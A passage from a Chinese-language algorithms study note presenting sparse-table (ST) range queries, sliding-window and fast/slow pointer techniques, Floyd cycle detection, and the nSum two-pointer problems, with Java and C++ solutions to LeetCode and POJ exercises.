temp2)), temp3));\n      }\n\n    }\n  }\n}\n\nclass ST {\n  int F[][];\n\n  public ST(int[] nums) {\n    int n = nums.length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    for (int i = 0; i < n; i++) {\n      F[i][0] = nums[i];\n    }\n    for (int j = 1; j <= k; j++) {\n      for (int i = 0; i < n - (1 << j) + 1; i++) {\n        F[i][j] = Math.max(F[i][j - 1], F[i + (1 << (j - 1))][j - 1]);\n      }\n    }\n  }\n\n  int query(int l, int r) {\n    if (l > r) {\n      return 0;\n    }\n    int k = (int) (Math.log(r - l + 1) / Math.log(2));\n    return Math.max(F[l][k], F[r - (1 << k) + 1][k]);\n  }\n}\n```\n\n假设当`nums=[-1, -1, 1, 1, 1, 1, 3, 10, 10, 10]`时：\n- `freq = [1, 2, 1, 2, 3, 4, 1, 1, 2, 3]`\n- `p    = [0, 0, 1, 1, 1, 1, 2, 3, 3, 3]`\n- `l    = [0, 2, 6, 7, 0, 0, 0, 0, 0, 0]`\n- `r    = [1, 5, 6, 9, 0, 0, 0, 0, 0, 0]`\n\n#### 二维ST表\n求一个块内的最值，可以把块分成多行，每行求一次RMQ即可，因此也要对每一行建一个ST表。\n\n##### 模版\n```java\nclass ST {\n  // F[r][i][j]: 表示第r行的[i, i+2^j-1]区间的最大值\n  int F[][][];\n\n  public ST(int[][] nums) {\n    int n = nums[0].length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    int row = nums.length;\n    F = new int[row][n][k + 1];\n    for (int r = 0; r < row; r++) {\n      for (int c = 0; c < n; c++) {\n        F[r][c][0] = nums[r][c];\n      }\n      for (int j = 1; j <= k; j++) {\n        for (int i = 0; i < n - (1 << j) + 1; i++) {\n          F[r][i][j] = Math.max(F[r][i][j - 1], F[r][i + (1 << (j - 1))][j - 1]);\n        }\n      }\n    }\n  }\n\n  /**\n   * @param row    矩阵左上顶点位于的行\n   * @param col    矩阵左上顶点位于的列\n   * @param width  矩阵宽度（即一行元素的个数）\n   * @param height 矩阵高度（即一列元素的个数）\n   * @return 矩阵范围内的最值\n   */\n  int query(int row, int col, int width, int height) {\n    int max = Integer.MIN_VALUE;\n    for (int r = row; r < height + row; r++) {\n      int k = (int) (Math.log(width) / Math.log(2));\n      // 右边界\n      int rightCol = col + width - 1;\n      max = Math.max(max, Math.max(F[r][col][k], F[r][rightCol - (1 << k) + 1][k]));\n    }\n    return max;\n  }\n}\n```\n\n##### 例题1: 玉米地\n[玉米地](http://poj.org/problem?id=2019)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220604181746.png)\n\n代码：\n```java\nint N = cin.nextInt();\nint B = cin.nextInt();\nint K = cin.nextInt();\nint[][] map = new int[N][N];\n\npublic void solve() {\n  read(map);\n  ST st = new ST(map);\n  while (K-- != 0) {\n    int a = cin.nextInt();\n    int b = cin.nextInt();\n    System.out.println(st.query(a - 1, b - 1, B, B));\n  }\n}\n\nclass ST {\n  // F[r][i][j][0]: 表示第r行的[i, i+2^j-1]区间的最大值\n  // F[r][i][j][1]: 表示第r行的[i, i+2^j-1]区间的最小值\n  int F[][][][];\n\n  public ST(int[][] nums) {\n    int n = nums[0].length;\n    int k = (int) (Math.log(n) / Math.log(2));\n    int row = nums.length;\n    F = new int[row][n][k + 1][2];\n    for (int r = 0; r < row; r++) {\n      for (int c = 0; c < n; c++) {\n        F[r][c][0] = new int[]{nums[r][c], nums[r][c]};\n      }\n      for (int j = 1; j <= k; j++) {\n        for (int i = 0; i < n - (1 << j) + 1; i++) {\n          F[r][i][j][0] = Math.max(F[r][i][j - 1][0], F[r][i + (1 << (j - 1))][j - 1][0]);\n          F[r][i][j][1] = Math.min(F[r][i][j - 1][1], F[r][i + (1 << (j - 1))][j - 1][1]);\n        }\n      }\n    }\n  }\n\n  int query(int row, int col, int width, int height) {\n    int max = Integer.MIN_VALUE;\n    int min = Integer.MAX_VALUE;\n    for (int r = row; r < height + row; r++) {\n      int k = (int) (Math.log(width) / Math.log(2));\n      // 右边界\n      int rightCol = col + width - 1;\n      max = Math.max(max, Math.max(F[r][col][k][0], F[r][rightCol - (1 << k) + 1][k][0]));\n      min = Math.min(min, Math.min(F[r][col][k][1], F[r][rightCol - (1 << k) + 1][k][1]));\n    }\n    return max - min;\n  }\n}\n```\n\n\n# 双指针\n## 同向双指针\n### 滑动窗口\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/RWZAv-PUMs4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/lVXO55Dcjg0\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n参考链接：https://labuladong.gitee.io/algo/1/12/\n\n\n#### 代码模版\n```java\nvoid slidingWindow(int[] nums) {\n  // 为左闭右开区间，即[left, right)\n  int left = 0, right = 0;\n\n  while (right < nums.length) {\n    //增大窗口\n    right++;\n    // TODO 根据窗口内容进行处理\n\n    // 缩小窗口\n    while (left <= right && windowNeedsShrink(left, right)) {\n      left++;\n      // TODO 根据窗口内容发生的变化进行处理\n    }\n\n  }\n}\n\n// 判断左侧窗口是否要收缩\nboolean windowNeedsShrink(int left, int right) {\n  // TODO\n  return false;\n}\n```\n\n**根据代码模版可以看出，在写滑动窗口时，关键是分析在什么情况下需要移动左指针来收缩窗口**\n\n#### 例题1: 长度最小的子数组\n[长度最小的子数组](https://leetcode.cn/problems/minimum-size-subarray-sum/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715164453.png)\n\n代码：\n```java\nclass Solution {\n  public int minSubArrayLen(int target, int[] nums) {\n    int n = nums.length;\n    int[] preSum = new int[n]; \n    preSum[0] = nums[0];\n    for (int i = 1; i < n; i++) {\n      preSum[i] = preSum[i - 1] + nums[i];\n    }\n    int res = n + 1;\n\n    int left = 0, right = 0;\n    while (right < n) {\n      while(left <= right && preSum[right] - preSum[left] + nums[left] >= target) {\n        res = Math.min(res, right - left + 1);\n        left++;\n      }\n      right++;\n    }\n    \n    return res == n + 1 ? 0 : res;\n  }\n}\n```\n\n#### 例题2: 无重复字符的最长子串\n[无重复字符的最长子串](https://leetcode.cn/problems/longest-substring-without-repeating-characters/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715201456.png)\n\n代码：\n```java\nclass Solution {\n  public int lengthOfLongestSubstring(String s) {\n    List<Character> list = new ArrayList();\n    char[] sCh = s.toCharArray();\n    \n    int res = 0;\n    int left = 0, right = 0;\n    while (right < sCh.length) {\n      right++;\n      while (left < right && list.contains(sCh[right - 1])) {\n        list.remove((Character)sCh[left]);\n        left++;\n      }\n      list.add(sCh[right - 1]);\n      res = Math.max(res, list.size());\n    }\n    return res;\n  }\n}\n```\n\n#### 例题3: 字符串的排列\n[字符串的排列](https://leetcode.cn/problems/permutation-in-string/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715202755.png)\n\n代码：\n```java \nclass Solution {\n  public boolean checkInclusion(String s1, String s2) {\n    if (s1.length() > s2.length()) return false;\n    char[] s1Ch = s1.toCharArray();\n    char[] s2Ch = s2.toCharArray();\n    int[] s1Cnt = new int[26];\n    int[] s2Cnt = new int[26];\n\n    int left = 0, right = s1Ch.length - 1;\n    for (int i = 0; i < right; i++) {\n      s1Cnt[s1Ch[i] - 'a']++;\n      s2Cnt[s2Ch[i] - 'a']++;\n    }\n    s1Cnt[s1Ch[s1Ch.length - 1] - 'a']++;\n    \n    while (right < s2Ch.length) {\n      right++;\n      s2Cnt[s2Ch[right - 1] - 'a']++;\n\n      if (Arrays.equals(s1Cnt, s2Cnt)) return true; \n\n      s2Cnt[s2Ch[left] - 'a']--;\n      left++;\n    }\n    return false;\n\n  }\n}\n``` \n\n#### 例题4：找到字符串中所有字母异位词\n[找到字符串中所有字母异位词](https://leetcode.cn/problems/find-all-anagrams-in-a-string/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220715201558.png)\n\n参考链接：https://leetcode.cn/problems/find-all-anagrams-in-a-string/solution/zhao-dao-zi-fu-chuan-zhong-suo-you-zi-mu-xzin/\n\n代码：\n```java\nclass Solution {\n  public List<Integer> findAnagrams(String s, String p) {\n    int pLength = p.length();\n    List<Integer> res = new ArrayList();\n    if (s.length() < pLength) return res;\n    char[] sCh = s.toCharArray();\n    char[] pCh = p.toCharArray();\n    int[] sCnt = new int[26];\n    int[] pCnt = new int[26];\n    for (int i = 0; i < pCh.length - 1; i++) {\n      sCnt[sCh[i] - 'a']++;\n      pCnt[pCh[i] - 'a']++;\n    }\n    pCnt[pCh[pCh.length - 1] - 'a']++;\n\n    int left = 0, right = pLength - 1;\n    while (right < s.length()) {\n      right++;\n      sCnt[sCh[right - 1] - 'a']++;\n\n      if (Arrays.equals(sCnt, pCnt)) {\n        res.add(left); \n      }\n      \n      sCnt[sCh[left] - 'a']--;\n      left++;\n    } \n    return res;\n  }\n}\n```\n\n#### 例题5: 最小覆盖子串\n[最小覆盖子串](https://leetcode.cn/problems/minimum-window-substring/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220719202340.png)\n\n##### 分析\n用validCnt来存储当前窗口中有几种字符达到了要求。例如t=\"ABC\", 当窗口中字符串为\"ADOB\"时，validCnt等于2，因为窗口中A、B两中字符出现次数都不少于t中该对应字符出现的次数，所以窗口中达到要求的字符有A、B两种。\n\n窗口要求：\n\n代码：\n```java\nclass Solution {\n  public String minWindow(String s, String t) {\n    char[] tCh = t.toCharArray();\n    char[] sCh = s.toCharArray();\n    Map<Character, Integer> windowMap = new HashMap();\n    Map<Character, Integer> tMap = new HashMap(); \n    for (char ch : tCh) {\n      tMap.put(ch, tMap.getOrDefault(ch, 0) + 1);\n    }\n    System.out.println(tMap);\n    int[] res = new int[2];\n    int validCnt = 0;\n    int left = 0, right = 0;\n    while (right < sCh.length) {\n      char ch = sCh[right];\n      right++;\n      windowMap.put(ch, windowMap.getOrDefault(ch, 0) + 1);\n      if (windowMap.get(ch).equals(tMap.get(ch))) validCnt++;\n\n      // 缩小窗口\n      while (validCnt == tMap.keySet().size() && !windowMap.get(sCh[left]).equals(tMap.get(sCh[left]))) {\n        windowMap.put(sCh[left], windowMap.get(sCh[left]) - 1);\n        left++;\n      }\n\n      if (validCnt == tMap.keySet().size()) {\n        if ((res[1] == res[0] && res[1] == 0) || res[1] - res[0] > right - left) {\n          res[0] = left;\n          res[1] = right;\n        } \n      }\n\n    }\n    System.out.println(windowMap);\n    return s.substring(res[0], res[1]);\n  }\n}\n```\n\n#### 例题6: 至少有 K 个重复字符的最长子串\n[至少有 K 个重复字符的最长子串](https://leetcode.cn/problems/longest-substring-with-at-least-k-repeating-characters/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220719191845.png)\n\n##### 分析 \n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/j6hIrGX8iIA\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n用validCnt来存储当前窗口中有几种字符达到了要求\n\n```java\nclass Solution {\n  public int longestSubstring(String s, int k) {\n    char[] sCh = s.toCharArray();\n    int res = 0;\n    for (int i = 1; i < 27; i++) {\n      Map<Character, Integer> map = new HashMap();\n      int validCnt = 0;\n      int left = 0, right = 0;\n      while (right < sCh.length) {\n        right++;\n        map.put(sCh[right - 1], map.getOrDefault(sCh[right - 1] , 0) + 1);\n        if (map.get(sCh[right - 1]) == k) validCnt++;\n\n        // 缩小窗口\n        while (map.keySet().size() > i) {\n          if (map.get(sCh[left]) == k) {\n            validCnt--;\n          }\n          if (map.get(sCh[left]) == 1) {\n            map.remove(sCh[left]);\n          } else {\n            map.put(sCh[left], map.get(sCh[left]) - 1);\n          }\n          left++;\n        }\n\n        if (validCnt == i) {\n          res = Math.max(res, right - left);\n        }\n      }\n    }\n    return res;\n  }\n}\n```\n\n#### 例题7: 替换后的最长重复字符\n[替换后的最长重复字符](https://leetcode.cn/problems/longest-repeating-character-replacement/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720194852.png)\n\n##### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/zGgEJetsqYs\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int characterReplacement(String s, int k) {\n    int[] sCnt = new int[26];\n    char[] sCh = s.toCharArray();\n    int res = 0;\n    int left = 0, right = 0;\n    while (right < sCh.length) {\n      right++;\n      sCnt[sCh[right - 1] - 'A']++;\n      if (left < right && right - left - getMaxCnt(sCnt) > k) {\n        sCnt[sCh[left] - 'A']--;\n        left++;\n      }\n      res = Math.max(res, right - left);\n    }\n    return res;\n  }\n\n  int getMaxCnt(int[] sCnt) {\n    return Arrays.stream(sCnt).max().getAsInt();\n  }\n\n}\n```\n\n### 快慢指针\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720223656.png)\n\n#### 找出链表上某个点\n##### 例题1: 链表的中间结点\n[链表的中间结点](https://leetcode.cn/problems/middle-of-the-linked-list/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720213323.png)\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode() {}\n *     ListNode(int val) { this.val = val; }\n *     ListNode(int val, ListNode next) { this.val = val; this.next = next; }\n * }\n */\nclass Solution {\n  public ListNode middleNode(ListNode head) {\n    ListNode slow = head, fast = head;\n    while (fast != null && fast.next != null) {\n      slow = slow.next;\n      fast = fast.next.next;\n    }\n    return slow;    \n  }\n}\n```\n\n##### 例题2: 删除链表的倒数第 N 个结点\n[删除链表的倒数第 N 个结点](https://leetcode.cn/problems/remove-nth-node-from-end-of-list/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720210009.png)\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode() {}\n *     ListNode(int val) { this.val = val; }\n *     ListNode(int val, ListNode next) { this.val = val; this.next = next; }\n * }\n */\nclass Solution {\n  public ListNode removeNthFromEnd(ListNode head, int n) {\n    ListNode p = head;\n    ListNode pre = head;\n    while (n-- != 0) {\n      p = p.next;\n    }\n    if (p == null) {\n      return head.next;\n    }\n    while (p.next != null) {\n      p = p.next; \n      pre = pre.next;\n    }\n    pre.next = pre.next.next;\n    return head;\n  }\n}\n```\n\n#### 原地修改数组\n数组问题中比较常见的快慢指针技巧，是让你原地修改数组。\n\n##### 例题1: 删除有序数组中的重复项\n[删除有序数组中的重复项](https://leetcode.cn/problems/remove-duplicates-from-sorted-array/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720215621.png)\n\n###### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/vVTo_VKRGus\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public int removeDuplicates(int[] nums) {\n    int slow = 0, fast = 0;\n    while (fast < nums.length) {\n      if (nums[fast] != nums[slow]) {\n        slow++;\n        nums[slow] = nums[fast];\n      }\n      fast++;\n    }\n    return slow + 1;\n  }\n}\n```\n\n##### 例题2: 删除排序链表中的重复元素\n[删除排序链表中的重复元素](https://leetcode.cn/problems/remove-duplicates-from-sorted-list/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720220519.png)\n\n做法与`例题:删除有序数组中的重复项`相似\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode() {}\n *     ListNode(int val) { this.val = val; }\n *     ListNode(int val, ListNode next) { this.val = val; this.next = next; }\n * }\n */\nclass Solution {\n  public ListNode deleteDuplicates(ListNode head) {\n    if (head == null) return null;\n    ListNode slow = head;\n    ListNode fast = head;\n    while (fast != null) {\n      if (fast.val != slow.val) {\n        slow.next = fast;\n        slow = fast;\n      }\n      fast = fast.next;\n    }\n    slow.next = null;\n    return head;\n  }\n}\n```\n\n##### 例题3: 移除元素\n[移除元素](https://leetcode.cn/problems/remove-element/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720221536.png)\n\n代码：\n```java\nclass Solution {\n  public int removeElement(int[] nums, int val) {\n    int slow = 0, fast = 0;\n    while (fast < nums.length) {\n      if (nums[fast] != val) {\n        nums[slow] = nums[fast];\n        slow++;\n      }\n      fast++;\n    }\n    return slow;\n  }\n}\n```\n\n##### 例题4: 移动零\n[移动零](https://leetcode.cn/problems/move-zeroes/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720222510.png)\n\n代码：\n```java\nclass Solution {\n  public void moveZeroes(int[] nums) {\n    int slow = 0, fast = 0;\n    while (fast < nums.length) {\n      if (nums[fast] != 0) {\n        nums[slow] = nums[fast];\n        slow++;\n      }\n      fast++;\n    }\n    while (slow < nums.length) {\n      nums[slow++] = 0; \n    }\n  }\n}\n```\n\n#### Floyd判圈算法\n##### 算法简述\nFloyd判圈算法（Floyd Cycle Detection Algorithm），又称龟兔赛跑算法（Tortoise and Hare Algorithm），是一个可以在有限状态机、迭代函数或者链表上判断是否存在环，以及判断环的起点与长度的算法。\n\n##### 基本思路\n在某种关系下，顶点 i 到 k 拓扑有序，顶点 k 到 j 也是相同的顺序，那么 i 和 j 也存在这个顺序。要是某一个顶点出现了自己到自己的环，那么图中就有环，但是这种方法复杂度高一些，没有检测顶点出度或者DFS的方法快，但是非常简单。\n\n##### 判断是否有环？\n龟兔解法的基本思想可以用我们跑步的例子来解释，如果两个人同时出发，如果赛道有环，那么快的一方总能追上慢的一方。进一步想，追上时快的一方肯定比慢的一方多跑了几圈，即多跑的路的长度是圈的长度的倍数。\n\n基于上面的想法，Floyd用两个指针，一个慢指针（龟）每次前进一步，快指针（兔）指针每次前进两步（两步或多步效果时等价的，只要一个比另一个快就行）。如果两者在链表头以外的某一点相遇（即相等）了，那么说明链表有环，否则，如果（快指针）到达了链表的结尾，那么说明没坏。\n\n##### 求环的长度\n假设相遇点为B点,让其中一个指针停在B不动，另一个一步一步向前走并记录步数，再次相遇时步数即为环的长度。\n\n##### 如何确定环的起点\n假设相遇点为B点。方法是将其中一个指针移到链表起点，另一个指针为B点,两者同时移动，每次移动一步，那么两者相遇的地方就是环的起点。\n\n\n##### 例题1：环形链表\n[环形链表](https://leetcode.cn/problems/linked-list-cycle/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720210813.png)\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) {\n *         val = x;\n *         next = null;\n *     }\n * }\n */\npublic class Solution {\n  public boolean hasCycle(ListNode head) {\n    ListNode slow = head;\n    ListNode fast = head;\n    while(fast != null && fast.next != null) {\n      slow = slow.next;\n      fast = fast.next.next;\n      if (slow == fast) {\n        return true;\n      }\n    }\n    return false;\n  }\n}\n```\n\n##### 例题2：环形链表 II\n[环形链表 II](https://leetcode.cn/problems/linked-list-cycle-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220720211432.png)\n\n文字讲解：https://leetcode.cn/problems/linked-list-cycle-ii/solution/142-huan-xing-lian-biao-ii-jian-hua-gong-shi-jia-2/\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) {\n *         val = x;\n *         next = null;\n *     }\n * }\n */\npublic class Solution {\n  public ListNode detectCycle(ListNode head) {\n    ListNode slow = head;\n    ListNode fast = head;\n    ListNode p = null, q = head;\n    while (fast != null && fast.next != null) {\n      slow = slow.next;\n      fast = fast.next.next;\n      if (slow == fast) {\n        p = slow;\n        break;\n      }\n    }\n    if (p == null) {\n      return null;\n    }\n    while (p != q) {\n      p = p.next;\n      q = q.next;\n    }\n    return p;\n  }\n}\n```\n\n## 反向双指针\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721105057.png)\n\n### NSUM 问题\n\n参考链接：https://mp.weixin.qq.com/s/fSyJVvggxHq28a0SdmZm6Q\n\n经常刷力扣的读者肯定知道鼎鼎有名的 twoSum 问题，不过除了 twoSum 问题，力扣上面还有 3Sum，4Sum 问题，以后如果想出个 5Sum，6Sum 也不是不可以。\n\n总结来说，这类 nSum 问题就是给你输入一个数组 nums 和一个目标和 target，让你从 nums 选择 n 个数，使得这些数字之和为 target。\n\n#### twoSum问题\n\n力扣上的 twoSum 问题，题目要求返回的是索引，这里我来编一道 twoSum 题目，不要返回索引，返回元素的值：\n\n如果假设输入一个数组 nums 和一个目标和 target，请你返回 nums 中能够凑出 target 的两个元素的值，比如输入 nums = [5,3,1,6], target = 9，那么算法返回两个元素 [3,6]。可以假设只有且仅有一对儿元素可以凑出 target。\n\n我们可以先对 nums 排序，然后利用前文「双指针技巧汇总」写过的左右双指针技巧，从两端相向而行就行了：\n```cpp\nvector<int> twoSum(vector<int>& nums, int target) {\n    // 先对数组排序\n    sort(nums.begin(), nums.end());\n    // 左右指针\n    int lo = 0, hi = nums.size() - 1;\n    while (lo < hi) {\n        int sum = nums[lo] + nums[hi];\n        // 根据 sum 和 target 的比较，移动左右指针\n        if (sum < target) {\n            lo++;\n        } else if (sum > target) {\n            hi--;\n        } else if (sum == target) {\n            return {nums[lo], nums[hi]};\n        }\n    }\n    return {};\n}\n```\n这样就可以解决这个问题，不过我们要继续魔改题目，把这个题目变得更泛化，更困难一点：\n\nnums 中可能有多对儿元素之和都等于 target，请你的算法返回所有和为 target 的元素对儿，其中不能出现重复。\n\n函数签名如下：\n```cpp\nvector<vector<int>> twoSumTarget(vector<int>& nums, int target);\n```\n比如说输入为 nums = [1,3,1,2,2,3], target = 4，那么算法返回的结果就是：[[1,3],[2,2]]。\n\n对于修改后的问题，关键难点是现在可能有多个和为 target 的数对儿，还不能重复，比如上述例子中 [1,3] 和 [3,1] 就算重复，只能算一次。\n\n首先，基本思路肯定还是排序加双指针：\n```cpp\nvector<vector<int>> twoSumTarget(vector<int>& nums, int target {\n    // 先对数组排序\n    sort(nums.begin(), nums.end());\n    vector<vector<int>> res;\n    int lo = 0, hi = nums.size() - 1;\n    while (lo < hi) {\n        int sum = nums[lo] + nums[hi];\n        // 根据 sum 和 target 的比较，移动左右指针\n        if      (sum < target) lo++;\n        else if (sum > target) hi--;\n        else {\n            res.push_back({lo, hi});\n            lo++; hi--;\n        }\n    }\n    return res;\n}\n```\n但是，这样实现会造成重复的结果，比如说 nums = [1,1,1,2,2,3,3], target = 4，得到的结果中 [1,3] 肯定会重复。\n\n出问题的地方在于 sum == target 条件的 if 分支，当给 res 加入一次结果后，lo 和 hi 不应该改变 1 的同时，还应该跳过所有重复的元素：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721092944.png)\n\n所以，可以对双指针的 while 循环做出如下修改：\n```cpp\nwhile (lo < hi) {\n    int sum = nums[lo] + nums[hi];\n    // 记录索引 lo 和 hi 最初对应的值\n    int left = nums[lo], right = nums[hi];\n    if (sum < target)      lo++;\n    else if (sum > target) hi--;\n    else {\n        res.push_back({left, right});\n        // 跳过所有重复的元素\n        while (lo < hi && nums[lo] == left) lo++;\n        while (lo < hi && nums[hi] == right) hi--;\n    }\n}\n```\n这样就可以保证一个答案只被添加一次，重复的结果都会被跳过，可以得到正确的答案。不过，受这个思路的启发，其实前两个 if 分支也是可以做一点效率优化，跳过相同的元素：\n```cpp\nvector<vector<int>> twoSumTarget(vector<int>& nums, int target) {\n    // nums 数组必须有序\n    sort(nums.begin(), nums.end());\n    int lo = 0, hi = nums.size() - 1;\n    vector<vector<int>> res;\n    while (lo < hi) {\n        int sum = nums[lo] + nums[hi];\n        int left = nums[lo], right = nums[hi];\n        if (sum < target) {\n            while (lo < hi && nums[lo] == left) lo++;\n        } else if (sum > target) {\n            while (lo < hi && nums[hi] == right) hi--;\n        } else {\n            res.push_back({left, right});\n            while (lo < hi && nums[lo] == left) lo++;\n            while (lo < hi && nums[hi] == right) hi--;\n        }\n    }\n    return res;\n}\n```\n这样，一个通用化的 twoSum 函数就写出来了，请确保你理解了该算法的逻辑，我们后面解决 3Sum 和 4Sum 的时候会复用这个函数。\n\n这个函数的时间复杂度非常容易看出来，双指针操作的部分虽然有那么多 while 循环，但是时间复杂度还是 O(N)，而排序的时间复杂度是 O(NlogN)，所以这个函数的时间复杂度是 O(NlogN)。\n\n#### 3Sum问题\n这是力扣第 15 题「三数之和」：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721100103.png)\n\n题目就是让我们找 nums 中和为 0 的三个元素，返回所有可能的三元组（triple），函数签名如下：\n```cpp\nvector<vector<int>> threeSum(vector<int>& nums);\n```\n这样，我们再泛化一下题目，不要光和为 0 的三元组了，计算和为 target 的三元组吧，同上面的 twoSum 一样，也不允许重复的结果：\n```cpp\nvector<vector<int>> threeSum(vector<int>& nums) {\n    // 求和为 0 的三元组\n    return threeSumTarget(nums, 0);\n}\n\nvector<vector<int>> threeSumTarget(vector<int>& nums, int target) {\n    // 输入数组 nums，返回所有和为 target 的三元组\n}\n```\n\n这个问题怎么解决呢？很简单，穷举呗。现在我们想找和为 target 的三个数字，那么对于第一个数字，可能是什么？nums 中的每一个元素 nums[i] 都有可能！\n\n那么，确定了第一个数字之后，剩下的两个数字可以是什么呢？其实就是和为 target - nums[i] 的两个数字呗，那不就是 twoSum 函数解决的问题么🤔\n\n可以直接写代码了，需要把 twoSum 函数稍作修改即可复用：\n```cpp\n/* 从 nums[start] 开始，计算有序数组\n * nums 中所有和为 target 的二元组 */\nvector<vector<int>> twoSumTarget(\n    vector<int>& nums, int start, int target) {\n    // 左指针改为从 start 开始，其他不变\n    int lo = start, hi = nums.size() - 1;\n    vector<vector<int>> res;\n    while (lo < hi) {\n        ...\n    }\n    return res;\n}\n\n/* 计算数组 nums 中所有和为 target 的三元组 */\nvector<vector<int>> threeSumTarget(vector<int>& nums, int target) {\n    // 数组得排个序\n    sort(nums.begin(), nums.end());\n    int n = nums.size();\n    vector<vector<int>> res;\n    // 穷举 threeSum 的第一个数\n    for (int i = 0; i < n; i++) {\n        // 对 target - nums[i] 计算 twoSum\n        vector<vector<int>> \n            tuples = twoSumTarget(nums, i + 1, target - nums[i]);\n        // 如果存在满足条件的二元组，再加上 nums[i] 就是结果三元组\n        for (vector<int>& tuple : tuples) {\n            tuple.push_back(nums[i]);\n            res.push_back(tuple);\n        }\n        // 跳过第一个数字重复的情况，否则会出现重复结果\n        while (i < n - 1 && nums[i] == nums[i + 1]) i++;\n    }\n    return res;\n}\n```\n需要注意的是，类似 twoSum，3Sum 的结果也可能重复，比如输入是 nums = [1,1,1,2,3], target = 6，结果就会重复。\n\n关键点在于，不能让第一个数重复，至于后面的两个数，我们复用的 twoSum 函数会保证它们不重复。所以代码中必须用一个 while 循环来保证 3Sum 中第一个元素不重复。\n\n至此，3Sum 问题就解决了，时间复杂度不难算，排序的复杂度为 O(NlogN)，twoSumTarget 函数中的双指针操作为 O(N)，threeSumTarget 函数在 for 循环中调用 twoSumTarget 所以总的时间复杂度就是 O(NlogN + N^2) = O(N^2)。\n\n#### 4Sum问题\n这是力扣第 18 题「四数之和」：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220721101131.png)\n\n函数签名如下：\n```cpp\nvector<vector<int>> fourSum(vector<int>& nums, int target);\n```\n都到这份上了，4Sum 完全就可以用相同的思路：穷举第一个数字，然后调用 3Sum 函数计算剩下三个数，最后组合出和为 target 的四元组。\n```cpp\nvector<vector<int>> fourSum(vector<int>& nums, int target) {\n    // 数组需要排序\n    sort(nums.begin(), nums.end());\n    int n = nums.size();\n    vector<vector<int>> res;\n    // 穷举 fourSum 的第一个数\n    for (int i = 0; i < n; i++) {\n        // 对 target - nums[i] 计算 threeSum\n        vector<vector<int>> \n            triples = threeSumTarget(nums, i + 1, target - nums[i]);\n        // 如果存在满足条件的三元组，再加上 nums[i] 就是结果四元组\n        for (vector<int>& triple : triples) {\n            triple.push_back(nums[i]);\n            res.push_back(triple);\n        }\n        // fourSum 的第一个数不能重复\n        while (i < n - 1 && nums[i] == nums[i + 1]) i++;\n    }\n    return res;\n}\n\n/* 从 nums[start] 开始，计算有序数组\n * nums 中所有和为 target 的三元组 */\nvector<vector<int>> \n    threeSumTarget(vector<int>& nums, int start, int target) {\n        int n = nums.size();\n        vector<vector<int>> res;\n        // i 从 start 开始穷举，其他都不变\n        for (int i = start; i < n; i++) {\n            ...\n        }\n        return res;\n```\n这样，按照相同的套路，4Sum 问题就解决了，时间复杂度的分析和之前类似，for 循环中调用了 threeSumTarget 函数，所以总的时间复杂度就是 O(N^3)。\n\n#### 100Sum问题？\n在 LeetCode 上，4Sum 就到头了，但是回想刚才写 3Sum 和 4Sum 的过程，实际上是遵循相同的模式的。我相信你只要稍微修改一下 4Sum 的函数就可以复用并解决 5Sum 问题，然后解决 6Sum 问题……\n\n那么，如果我让你求 100Sum 问题，怎么办呢？其实我们可以观察上面这些解法，统一出一个 nSum 函数：\n\n```cpp\n/* 注意：调用这个函数之前一定要先给 nums 排序 